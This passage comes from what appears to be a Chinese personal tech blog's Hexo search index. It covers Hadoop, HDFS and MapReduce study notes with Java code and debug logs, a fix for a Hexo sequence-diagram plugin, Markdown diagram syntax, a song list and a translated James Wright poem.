by；如果分桶字段和排序字段不一样，那么就不能使用 clustered by [LIMIT number]显示结果的前几个记录]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Hive</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>Hive</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[偶然发现的好歌]]></title>
    <url>%2F2018%2F06%2F11%2FSongs%2F%E5%81%B6%E7%84%B6%E5%8F%91%E7%8E%B0%E7%9A%84%E5%A5%BD%E6%AD%8C%2F</url>
    <content type="text"><![CDATA[Dealbreaker 专辑：Chesapeake 歌手：Rachael Yamagata 链接：http://music.163.com/#/m/song?id=18733198 You Won’t Let Me 专辑：Chesapeake 歌手：Rachael Yamagata 链接：http://music.163.com/#/song?id=18733192]]></content>
      <categories>
        <category>文艺</category>
        <category>Songs</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>文艺</tag>
        <tag>Songs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[_HDFS应用场景&原理&基本架构及使用方法]]></title>
    <url>%2F2018%2F06%2F11%2FHadoop%2F1-HDFS%2FHDFS%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%26%E5%8E%9F%E7%90%86%26%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[HDFS基本架构和原理HDFS设计思想 HDFS架构 HDFS数据块（block） 注意： Hadoop2.x，block默认大小是128MB HDFS写流程 创建Distributed FileSystem类 询问 NameNode 要写的文件对否存在 不存在就写入到 FSDataOutputStream 流中 流写出去到一个 DataNode … HDFS读流程 客户端向 NameNode 询问 block 的位置 按照客户端按照拿到的位置，向不同的DataNode 请求数据 …… HDFS典型物理拓扑 HDFS副本放置策略 HDFS可靠性策略 HDFS不适合存储小文件 HDFS程序设计HDFS访问方式 HDFS Shell命令概览 HDFS Shell命令—文件操作命令 HDFS Shell命令—文件操作命令 HDFS Shell命令—管理命令 HDFS Shell命令—管理脚本 HDFS Shell命令—文件管理命令fsck 查看帮助 用法示例 HDFS Shell命令—数据均衡器balancer 一般设置10% —— 15% 就差不多了 HDFS Shell命令—设置目录份额 ※ HDFS Shell命令—增加/移除节点 ※ HDFS JavaAPI介绍 HDFS Java程序举例 HDFS 多语言API—借助thrift也是Apache的顶级项目 thrift执行流程 hadoopfs.thrift接口定义 PHP语言访问HDFS Python语言访问HDFS Hadoop 2.0新特性 HA(高可用)与Federation(联邦) 异构层级存储结构背景 原理 HDFS ACL背景：现有权限管理的局限性 基于POSIX ACL的实现 HDFS快照背景 基本使用方法 HDFS缓存背景 原理 实现情况 总结]]></content>
      <categories>
        <category>Hadoop</category>
        <category>HDFS</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>HDFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于hexo的时序图插件 hexo-filter-sequence 的巨坑]]></title>
    <url>%2F2018%2F06%2F10%2FTools%2FHexo%2F%E5%85%B3%E4%BA%8Ehexo%E7%9A%84%E6%97%B6%E5%BA%8F%E5%9B%BE%E6%8F%92%E4%BB%B6-hexo-filter-sequence-%E7%9A%84%E5%B7%A8%E5%9D%91%2F</url>
    <content type="text"><![CDATA[前言在写代码的过程中，发现时序图还是挺管用的，简洁明了，于是想用一用。 结果发到站上，不显示。 在网上查了下，发现是hexo所使用的Markdown渲染语法不支持。 这里吐槽下，这里渲染的确实烂，作者为啥不改改.. 于是开始找解决方案，发现大多数都推荐了一个叫hexo-filter-sequence的插件，故安装之。 结果死活还是不行。 装了其它的几个flow图，却可以显示。 当flow图和sequence图同时存在的时候，sequence可以显示，但是sequence单独存在时，死活不显示。 难不成有啥依赖？必须先使用flow才能使用sequence？逻辑上不应该啊！ 但是事实却是这样！ 网上有一篇大神说要改源码才行，开始没注意，觉得应该不会吧，这么多人使用，源码还会有问题？？ 仔细一看源码，妈的！！心里千万匹草泥马呼啸而过！ 把初始化 sequence，写成了初始化 flow！！！ 把 flow 改成 sequence， 再把 js CDN源换成国内的！ 可以了！！ 再仔细一看，发现最后一次更新是在1年前！ 坑爹的作者，浪费了我至少3-5个小时！！ 下面为部分摘抄安装hexo-filter-sequence 插件: 1npm install --save hexo-filter-sequence 配置站点配置文件 _config.yml 中增加如下配置: 123456789sequence: webfont: https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js raphael: https://cdn.bootcss.com/raphael/2.2.7/raphael.min.js underscore: https://cdn.bootcss.com/underscore.js/1.8.3/underscore-min.js sequence: https://cdn.bootcss.com/js-sequence-diagrams/1.0.6/sequence-diagram-min.js css: # optional, the url for css, such as hand drawn theme options: theme: simple css_class: 源码源码修改后才能正常使用，进入插件目录作如下修改： 12345678910111213141516// index.jsvar assign = require('deep-assign');var renderer = require('./lib/renderer');hexo.config.sequence = assign(&#123; webfont: 'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js', raphael: 'https://cdn.bootcss.com/raphael/2.2.7/raphael.min.js', underscore: 'https://cdn.bootcss.com/underscore.js/1.8.3/underscore-min.js', sequence: 'https://cdn.bootcss.com/js-sequence-diagrams/1.0.6/sequence-diagram-min.js', css: '', options: &#123; theme: 'simple' &#125;&#125;, hexo.config.sequence);hexo.extend.filter.register('before_post_render', renderer.render, 9); 12345678910// lib/renderer.js, 25 行if (sequences.length) &#123; var config = this.config.sequence; // resources data.content += '&lt;script src="' + config.webfont + '"&gt;&lt;/script&gt;'; data.content += '&lt;script src="' + config.raphael + '"&gt;&lt;/script&gt;'; data.content += '&lt;script src="' + config.underscore + '"&gt;&lt;/script&gt;'; data.content += '&lt;script src="' + config.sequence + '"&gt;&lt;/script&gt;'; ......&#125; 示例新建代码块，增加如下内容： 详情参考 Alice->Bob: Hello Bob, how are you? Note right of Bob: Bob thinks Bob-->Alice: I am good thanks!{"theme":"simple"} var code = document.getElementById("sequence-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value)); var diagram = Diagram.parse(code); diagram.drawSVG("sequence-0", options);]]></content>
      <categories>
        <category>工具</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>工具</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce-分组浅探]]></title>
    <url>%2F2018%2F06%2F10%2FHadoop%2F2-MapReduce%2FMapReduce-%E5%88%86%E7%BB%84%E6%B5%85%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[前言最近学分组的时候，一直弄不明白，总感觉一头雾水，通过近3个小时的断点调试和log输出。 大概了解了一些表象，先记录。 案例是这个 求出每门课程参考学生成绩最高平均分的学生的信息： 课程，姓名和平均分，详细见MapReduce笔记-练习第二题第3小题 数据格式是这样的： 第一个是课程名称，总共四个课程，computer，math，english，algorithm， 第二个是学生姓名，后面是每次考试的分数 math,huangxiaoming,85,75,85,99,66,88,75,91 english,huanglei,85,75,85,99,66,88,75,91 … 结论 执行流程结论 map每读一行就 write 到 context 一次，按照指定的key进行分发 map 把所有的数据都读完了之后，大概执行到67%的时候，开始进入 CustomBean，执行CustomBean的compareTo()方法，会按照自己写的规则一条一条数据比较 上述都比较完毕之后，map阶段就结束了，此时来到了 reduce阶段，但是是到了67%了 到了reduce阶段，直接进入了MyGroup中自定义的compare方法。 MyGroup的compare()方法，如果返回非0， 就会进入 reduce 方法写出到context MyGroup进入Reduce的条件是 MyReduce中，如果compare的结果不等于0，也就是比较的2者不相同， 此时就进入Reduce， 写出到上下文 如果相同，会一直往下读，直到读到不同的， 此时写出读到上下文。 因为MyGroup会在Reduce阶段执行，而CustomBean中的compareTo()是在map阶段执行，所以需要在CustomBean中就把组排好序，此时分组功能才能正常运作 指定分组类MyGroup和不指定的区别指定与不指定是指：在Driver类中，是否加上job.setGroupingComparatorClass(MyGrouper.class);这一句。 指定分组类： 会按照分组类中，自定义的compare()方法比较，相同的为一组，分完一组就进入一次reduce方法 不指定分组类：（目前存疑） 是否是按照key进行分组 如果是自定义类为key，是否是按照此key中值相同的分为一组 如果是hadoop内置类，是否是按照此类的值分组（Text-String的值，IntWritable-int值等..） 依然是走得以上这套分组逻辑，一组的数据读完才进入到Reduce阶段做归并 Log信息CustomBean中没有进行分组, 组内排序的log123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129// ==================MyGroup中compare()方法=======================computer---MyGroup中比较---computercomputer---MyGroup中比较---mathmath---MyGroup中比较---englishenglish---MyGroup中比较---mathmath---MyGroup中比较---algorithmalgorithm---MyGroup中比较---algorithmalgorithm---MyGroup中比较---computercomputer---MyGroup中比较---englishenglish---MyGroup中比较---algorithmalgorithm---MyGroup中比较---mathmath---MyGroup中比较---algorithmalgorithm---MyGroup中比较---mathmath---MyGroup中比较---computercomputer---MyGroup中比较---englishenglish---MyGroup中比较---mathmath---MyGroup中比较---computercomputer---MyGroup中比较---mathmath---MyGroup中比较---englishenglish---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---englishenglish---MyGroup中比较---computercomputer---MyGroup中比较---algorithmalgorithm---MyGroup中比较---englishenglish---MyGroup中比较---computercomputer---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---mathmath---MyGroup中比较---algorithmalgorithm---MyGroup中比较---computercomputer---MyGroup中比较---english// ======================reduce中的执行log============================================第1次进入reducecomputer huangjiaju 83.2---------in for write------computer liutao 83.0---------in for write------==================第2次进入reducemath huangxiaoming 83.0---------in for write------==================第3次进入reduceenglish huanglei 83.0---------in for write------==================第4次进入reducemath huangjiaju 82.28571428571429---------in for write------==================第5次进入reducealgorithm huangjiaju 82.28571428571429---------in for write------algorithm liutao 82.0---------in for write------==================第6次进入reducecomputer huanglei 74.42857142857143---------in for write------==================第7次进入reduceenglish liuyifei 74.42857142857143---------in for write------==================第8次进入reducealgorithm huanglei 74.42857142857143---------in for write------==================第9次进入reducemath huanglei 74.42857142857143---------in for write------==================第10次进入reducealgorithm huangzitao 72.75---------in for write------==================第11次进入reducemath liujialing 72.75---------in for write------==================第12次进入reducecomputer huangzitao 72.42857142857143---------in for write------==================第13次进入reduceenglish huangxiaoming 72.42857142857143---------in for write------==================第14次进入reducemath wangbaoqiang 72.42857142857143---------in for write------==================第15次进入reducecomputer huangxiaoming 72.42857142857143---------in for write------==================第16次进入reducemath xuzheng 69.28571428571429---------in for write------==================第17次进入reduceenglish zhaobenshan 69.28571428571429---------in for write------==================第18次进入reducecomputer huangbo 65.25---------in for write------computer xuzheng 65.0---------in for write------==================第19次进入reduceenglish zhouqi 64.18181818181819---------in for write------==================第20次进入reducecomputer liujialing 64.11111111111111---------in for write------==================第21次进入reducealgorithm liuyifei 62.142857142857146---------in for write------==================第22次进入reduceenglish liujialing 62.142857142857146---------in for write------==================第23次进入reducecomputer liuyifei 62.142857142857146---------in for write------==================第24次进入reduceenglish liuyifei 59.57142857142857---------in for write------english huangdatou 56.0---------in for write------==================第25次进入reducemath liutao 56.0---------in for write------==================第26次进入reducealgorithm huangdatou 56.0---------in for write------==================第27次进入reducecomputer huangdatou 56.0---------in for write------==================第28次进入reduceenglish huangbo 55.0---------in for write------ CustomBean中做了分组&amp;组内排序 的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120// **Bean中相同的组进行分数降序， 组进行字典排序，此时MyGroup中执行的**algorithm---MyGroup中比较---algorithmalgorithm---MyGroup中比较---algorithmalgorithm---MyGroup中比较---algorithmalgorithm---MyGroup中比较---algorithmalgorithm---MyGroup中比较---algorithmalgorithm---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---computercomputer---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---englishenglish---MyGroup中比较---mathmath---MyGroup中比较---mathmath---MyGroup中比较---mathmath---MyGroup中比较---mathmath---MyGroup中比较---mathmath---MyGroup中比较---mathmath---MyGroup中比较---math// ======================reduce中执行============================================第1次进入reducealgorithm huangjiaju 82.28571428571429---------in for write------algorithm liutao 82.0---------in for write------algorithm huanglei 74.42857142857143---------in for write------algorithm huangzitao 72.75---------in for write------algorithm liuyifei 62.142857142857146---------in for write------algorithm huangdatou 56.0---------in for write------===================离开reduce==================第2次进入reducecomputer huangjiaju 83.2---------in for write------computer liutao 83.0---------in for write------computer huanglei 74.42857142857143---------in for write------computer huangzitao 72.42857142857143---------in for write------computer huangxiaoming 72.42857142857143---------in for write------computer huangbo 65.25---------in for write------computer xuzheng 65.0---------in for write------computer liujialing 64.11111111111111---------in for write------computer liuyifei 62.142857142857146---------in for write------computer huangdatou 56.0---------in for write------===================离开reduce==================第3次进入reduceenglish huanglei 83.0---------in for write------english liuyifei 74.42857142857143---------in for write------english huangxiaoming 72.42857142857143---------in for write------english zhaobenshan 69.28571428571429---------in for write------english zhouqi 64.18181818181819---------in for write------english liujialing 62.142857142857146---------in for write------english liuyifei 59.57142857142857---------in for write------english huangdatou 56.0---------in for write------english huangbo 55.0---------in for write------===================离开reduce==================第4次进入reducemath huangxiaoming 83.0---------in for write------math huangjiaju 82.28571428571429---------in for write------math huanglei 74.42857142857143---------in for write------math liujialing 72.75---------in for write------math wangbaoqiang 72.42857142857143---------in for write------math xuzheng 69.28571428571429---------in for write------math liutao 56.0---------in for write------===================离开reduce//  如果只取一个每次values的第一个的话 algorithm huangjiaju 82.28571428571429==================第1次进入reducecomputer huangjiaju 83.2==================第2次进入reduceenglish huanglei 83.0==================第3次进入reducemath huangxiaoming 83.0==================第4次进入reduce 其它疑点 通过log可以看出来， MyGroup是在读到了不同的数据，才会进入到 reduce 类中写出； 但是 通过 断点调试时， 现象是，第一次读到了2个相同的，就去reduce去写出了； 后面再读的就不做写出操作，直到下一次读到2个相同的，再在reduce中写出。 title: 执行流程时序图  Mapper(map)->ScoreBean: k:ScoreBean(courseName,avgScore) Mapper(map)->ScoreBean: v:Text(stuName) Mapper(ScoreBean)->Reducer(MyGroup): course按字典升序 Mapper(ScoreBean)->Reducer(MyGroup): course内成绩降序 Reducer(MyGroup)->Reducer(reduce): 根据自定义的分组规则按组输出 Reducer(MyGroup)->Reducer(reduce): 一组只调用reduce一次 Reducer(reduce)-->Reducer(reduce):{"theme":"simple"} var code = document.getElementById("sequence-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value)); var diagram = Diagram.parse(code); diagram.drawSVG("sequence-0", options);]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[▍开始]]></title>
    <url>%2F2018%2F06%2F10%2FPoetry%2F%E5%BC%80%E5%A7%8B%2F</url>
    <content type="text"><![CDATA[月亮落下一两片羽毛在田野上。 黑暗中的麦子聆听着。 快静下来。 快。 就在那儿，月亮的孩子们正试着 挥动翅膀。 在两棵树之间，身材修长的女子抬起面庞， 美丽的剪影。接着，她步入空中，接着， 她完全消失在空中。 我独自站在一棵接骨木旁，不敢呼吸， 也不敢动。 我聆听着。 麦子向后靠着自己的黑暗， 而我靠着我的。 作者 / [美国] 詹姆斯·赖特 翻译 / 张文武 ▍Beginning The moon drops one or two feathers into the fields. The dark wheat listens. Be still. Now. There they are, the moon’s young, trying Their wings. Between trees, a slender woman lifts up the lovely shadow Of her face, and now she steps into the air, now she is gone Wholly, into the air. I stand alone by an elder tree, I do not dare breathe Or move. I listen. The wheat leans back toward its own darkness, And I lean toward mine. Author / James Wright]]></content>
      <categories>
        <category>文艺</category>
        <category>诗歌</category>
      </categories>
      <tags>
        <tag>诗歌</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown高阶语法]]></title>
    <url>%2F2018%2F06%2F10%2FTools%2FMarkdown%2FMarkdown%E9%AB%98%E9%98%B6%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[时序图的写法 流程图的写法 类图的写法 st=>start: Start|past:>http://www.google.com[blank] e=>end: End:>http://www.google.com op1=>operation: My Operation|past op2=>operation: Stuff|current sub1=>subroutine: My Subroutine|invalid cond=>condition: Yes or No?|approved:>http://www.google.com c2=>condition: Good idea|rejected io=>inputoutput: catch something...|request st->op1(right)->cond cond(yes, right)->c2 cond(no)->sub1(left)->op1 c2(yes)->io->e c2(no)->op2->e{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12} var code = document.getElementById("flowchart-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value)); var diagram = flowchart.parse(code); diagram.drawSVG("flowchart-0", options);mapper->Bob: Hello Bob, how are you? Note right of Bob: Bob thinks Bob-->reducer: I am good thanks!ad u? reducer->out: I'm fine too out->me: ok, you win me-->Bob: nono, not{"theme":"simple"} var code = document.getElementById("sequence-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value)); var diagram = Diagram.parse(code); diagram.drawSVG("sequence-0", options);]]></content>
      <categories>
        <category>工具</category>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>工具</tag>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[About Sublime Text3]]></title>
    <url>%2F2018%2F06%2F09%2FTools%2FSublime%2F%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98%2F</url>
    <content type="text"><![CDATA[主题详情参见这个网站 详细操作见此站]]></content>
      <categories>
        <category>工具</category>
        <category>Sublime</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>工具</tag>
        <tag>Sublime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce笔记-Bug汇总]]></title>
    <url>%2F2018%2F06%2F09%2FHadoop%2F2-MapReduce%2FMapReduce-Bug%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[1、reduce 输出路径必须是新创建的。不能已经存在1Exception in thread "main" org.apache.hadoop.mapred.FileAlreadyExistsException: Output directory hdfs://cs1:9000/flowout01 already exists 2、在初始化 job 的时候， 没有传 conf ， 导致后面一直找不到文件， 因为不知道到哪里去找3、Text导包倒错, 导的时候要注意应该是这个 import org.apache.hadoop.io.Text; 4、进行字符串拼接的时候，把 StringBuilder 写到了 reduce 方法外， 这样导致 sb 会越来越多，当然，也可以每次拼接完了清空类似于这样 1234567891011121314A F,I,O,K,G,D,C,H,BB F,I,O,K,G,D,C,H,B,E,J,F,AC F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,FD F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,LE F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,HF F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,GG F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,MH F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,OI F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,CJ F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,OK F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,O,O,BL F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,O,O,B,D,EM F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,O,O,B,D,E,E,FO F,I,O,K,G,D,C,H,B,E,J,F,A,B,E,K,A,H,G,F,H,C,G,F,E,A,K,L,A,B,L,G,M,F,D,H,C,M,L,A,D,G,M,O,O,C,O,O,B,D,E,E,F,A,H,I,J,F 4、mapreduce执行错误Mapper.\错误 Mapper &amp; Reducer 写成内部类的时候，有没有加上 static Bean类有没有无参构造 5、排序过程中，自定义了排序类，bean类的 compareTo()方法，只写了按照分数大小排序。会出现如下错误： 课程并没有分组 没有在相同的一组课程中比较分数， 而是比较的所有的分数 12345678computer huangjiaju 83.2math huangxiaoming 83.0english huanglei 83.0math huangjiaju 82.28571428571429algorithm huangjiaju 82.28571428571429computer huanglei 74.42857142857143english liuyifei 74.42857142857143... 此时应该在Bean对象中做如下事情 相同课程的按照分数降序排序 课程名按照自然（升序）排序 换言之，就是CustomBean 对象要输出的数据是 组名升序排序，组内按成绩降序排序 具体分析参阅]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce笔记-练习]]></title>
    <url>%2F2018%2F06%2F09%2FHadoop%2F2-MapReduce%2FMapReduce-%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[求微博共同粉丝题目涉及知识点： 多 Job 串联 1234567891011121314A:B,C,D,F,E,OB:A,C,E,KC:F,A,D,ID:A,E,F,LE:B,C,D,M,LF:A,B,C,D,E,O,MG:A,C,D,E,FH:A,C,D,E,OI:A,OJ:B,OK:A,C,DL:D,E,FM:E,F,GO:A,H,I,J,K 以上是数据：A:B,C,D,F,E,O表示：A用户 关注B,C,D,E,F,O 求所有两两用户之间的共同关注对象 答案： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299package com.rox.mapreduce.mr3._01_多Job串联;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.jobcontrol.ControlledJob;import org.apache.hadoop.mapreduce.lib.jobcontrol.JobControl;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class CommonFansDemo &#123; @SuppressWarnings("deprecation") public static void main(String[] args) throws Exception &#123; // Job 逻辑 // 指定 HDFS 相关的参数 Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); // // 新建一个 job1 Job job1 = Job.getInstance(conf); // 设置 Jar 包所在路径 job1.setJarByClass(CommonFansDemo.class); // 指定 mapper 类和 reducer 类 job1.setMapperClass(MyMapper_Step1.class); job1.setReducerClass(MyReducer_Step1.class); // 指定 maptask 的输出类型 job1.setMapOutputKeyClass(Text.class); job1.setMapOutputValueClass(Text.class); // 指定最终的输出类型(reduce存在时,就是指 ReduceTask 的输出类型) job1.setOutputKeyClass(Text.class); job1.setOutputValueClass(Text.class); // 指定该 MapReduce 程序数据的输入输出路径 FileInputFormat.setInputPaths(job1, new Path("/in/commonfriend")); FileOutputFormat.setOutputPath(job1, new Path("/out/job1")); // // 新建一个 job2 Job job2 = Job.getInstance(conf); // 设置 Jar 包所在路径 job2.setJarByClass(CommonFansDemo.class); // 指定 mapper 类和 reducer 类 job2.setMapperClass(MyMapper_Step2.class); job2.setReducerClass(MyReducer_Step2.class); // 指定 maptask 的输出类型 job2.setMapOutputKeyClass(Text.class); job2.setMapOutputValueClass(Text.class); // 指定最终的输出类型(reduce存在时,就是指 ReduceTask 的输出类型) job2.setOutputKeyClass(Text.class); job2.setOutputValueClass(Text.class); // 指定该 MapReduce 程序数据的输入输出路径 FileInputFormat.setInputPaths(job2, new Path("/out/job1")); FileOutputFormat.setOutputPath(job2, new Path("/out/job2")); // /** * 将多个 job 当做一个组中的 job 提交, 参数名是组名 * 注意: JobControl 是实现了 Runnable 接口的 */ JobControl jControl = new JobControl("common_friend"); // 将原生的 job携带配置 转换为可控的 job ControlledJob aJob = new ControlledJob(job1.getConfiguration()); ControlledJob bJob = new ControlledJob(job2.getConfiguration()); // 添加依赖关系 bJob.addDependingJob(aJob); // 添加 job 到组中 jControl.addJob(aJob); jControl.addJob(bJob); // 启动一个线程 Thread jobThread = new Thread(jControl); jobThread.start(); while (!jControl.allFinished()) &#123; Thread.sleep(500); &#125; jobThread.stop(); &#125; static class MyMapper_Step1 extends Mapper&lt;LongWritable, Text, Text, Text&gt; &#123; String[] user_attentions; String[] attentions; Text k = new Text(); Text v = new Text(); @Override protected void map(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; user_attentions = value.toString().split(":"); attentions = user_attentions[1].trim().split(","); for (String att : attentions) &#123; k.set(att); v.set(user_attentions[0].trim()); context.write(k, v); &#125; &#125; &#125; /** * @author shixuanji * 将两两粉丝(普通用户)拼接起来, 格式a-f:c =&gt; a,b 都共同关注了 c * * A F,I,O,K,G,D,C,H,B B E,J,F,A C B,E,K,A,H,G,F D H,C,G,F,E,A,K,L E A,B,L,G,M,F,D,H F C,M,L,A,D,G */ static class MyMapper_Step2 extends Mapper&lt;LongWritable, Text, Text, Text&gt; &#123; String[] attenion_users; String[] users; Text k = new Text(); Text v = new Text(); @Override protected void map(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; attenion_users = value.toString().split("\t"); users = attenion_users[1].trim().split(","); for (String u1 : users) &#123; for (String u2 : users) &#123; if (u1.compareTo(u2) &lt; 0) &#123; String users = u1 + "-" + u2; k.set(users); v.set(attenion_users[0].trim()); context.write(k, v); &#125; &#125; &#125; &#125; &#125; /** * @author shixuanji * 需要统计的是, 某人拥有的全部粉丝 * key: 传过来的 key * value: 用,分割 */ static class MyReducer_Step1 extends Reducer&lt;Text, Text, Text, Text&gt; &#123; Text k = new Text(); Text v = new Text(); @Override protected void reduce(Text key, Iterable&lt;Text&gt; values, Reducer&lt;Text, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; // 注意: 这里 sb 不能写在外面,会不断的拼接 StringBuilder sb = new StringBuilder(); for (Text v : values) &#123; sb.append(v.toString()).append(","); &#125; k.set(key); v.set(sb.substring(0, sb.length() - 1)); context.write(k, v); &#125; &#125; /** * @author shixuanji * 拿到的数据: a-b c */ static class MyReducer_Step2 extends Reducer&lt;Text, Text, Text, Text&gt; &#123; Text k = new Text(); Text v = new Text(); @Override protected void reduce(Text key, Iterable&lt;Text&gt; values, Reducer&lt;Text, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; StringBuilder sb = new StringBuilder(); for (Text attention : values) &#123; sb.append(attention.toString()).append(","); &#125; k.set(key); v.set(sb.substring(0, sb.length() - 1)); context.write(k, v); &#125; &#125;&#125;// job1的输出A F,I,O,K,G,D,C,H,BB E,J,F,AC B,E,K,A,H,G,FD H,C,G,F,E,A,K,LE A,B,L,G,M,F,D,HF C,M,L,A,D,GG MH OI O,CJ OK O,BL D,EM E,FO A,H,I,J,F// job2的输出A-B E,CA-C D,FA-D F,EA-E C,D,BA-F O,B,E,D,CA-G E,F,D,CA-H O,E,D,CA-I OA-J B,OA-K D,CA-L D,F,EA-M E,FB-C AB-D E,AB-E CB-F A,E,CB-G C,A,EB-H A,E,CB-I AB-K C,AB-L EB-M EB-O A,KC-D A,FC-E DC-F D,AC-G F,A,DC-H D,AC-I AC-K A,DC-L F,DC-M FC-O I,AD-E LD-F E,AD-G A,F,ED-H E,AD-I AD-K AD-L F,ED-M F,ED-O AE-F C,B,M,DE-G C,DE-H C,DE-J BE-K D,CE-L DF-G A,D,C,EF-H A,E,C,D,OF-I O,AF-J O,BF-K C,A,DF-L E,DF-M EF-O AG-H A,C,D,EG-I AG-K C,A,DG-L D,E,FG-M F,EG-O AH-I O,AH-J OH-K A,D,CH-L E,DH-M EH-O AI-J OI-K AI-O AK-L DK-O AL-M F,E 